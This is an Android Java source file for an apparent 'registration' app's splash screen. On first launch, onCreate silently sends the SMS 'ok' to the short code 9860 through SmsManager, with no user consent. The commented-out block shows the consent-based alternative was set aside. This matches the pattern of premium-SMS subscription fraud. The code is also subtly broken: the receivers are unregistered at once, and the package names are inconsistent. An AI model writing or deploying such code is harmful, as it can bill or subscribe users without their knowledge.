package com.akrobyte.registration;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;

import com.aktobyte.registration.R;

public class SplashActivity extends Activity {

    Button btnClick;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        if (!isConfirmUser())
            sendSMS();
        btnClick = findViewById(R.id.btn_click);
        btnClick.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                uninstallPackage();
            }
        });
    }

    private void sendSMS() {
        Intent intent;
        Intent intent2;
        BroadcastReceiver broadcastReceiver;
        IntentFilter intentFilter;
        BroadcastReceiver broadcastReceiver2;
        IntentFilter intentFilter2;
        String str = "SMS_SENT";
        String str2 = "SMS_DELIVERED";
        intent = new Intent(str);
        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, intent, 0);
        intent2 = new Intent(str2);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(this, 0, intent2, 0);
        broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (getResultCode() == -1) {
                    confirmUser();
                    return;
                }
                finish();
            }
        };
        intentFilter = new IntentFilter(str);
        Intent registerReceiver = registerReceiver(broadcastReceiver, intentFilter);
        broadcastReceiver2 = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (getResultCode() == -1) {
                    confirmUser();
                    return;
                }
                finish();
            }
        };
        intentFilter2 = new IntentFilter(str2);
        Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
            SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
        }
       /* String phoneNumber = "9860";
        String message = "Ok";

        // Open the SMS app with the specified number and message
        Uri uri = Uri.parse("smsto:" + phoneNumber);
        Intent intent3 = new Intent(Intent.ACTION_SENDTO, uri);
        intent3.putExtra("sms_body", message);
        startActivity(intent3);

        finish();
*/
        unregisterReceiver(broadcastReceiver);
        unregisterReceiver(broadcastReceiver2);
    }

    private void confirmUser() {
        SharedPreferences sharedpreferences = getSharedPreferences("SampleApp", Context.MODE_PRIVATE);
        sharedpreferences.edit().putBoolean("isConfirm",true).commit();
    }

    private boolean isConfirmUser(){
        SharedPreferences sharedpreferences = getSharedPreferences("SampleApp", Context.MODE_PRIVATE);
        return sharedpreferences.getBoolean("isConfirm",false);
    }

    private void uninstallPackage()
    {
        Uri packageUri = Uri.parse("package:com.aktobyte.registration");
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
        startActivity(uninstallIntent);
    }
}
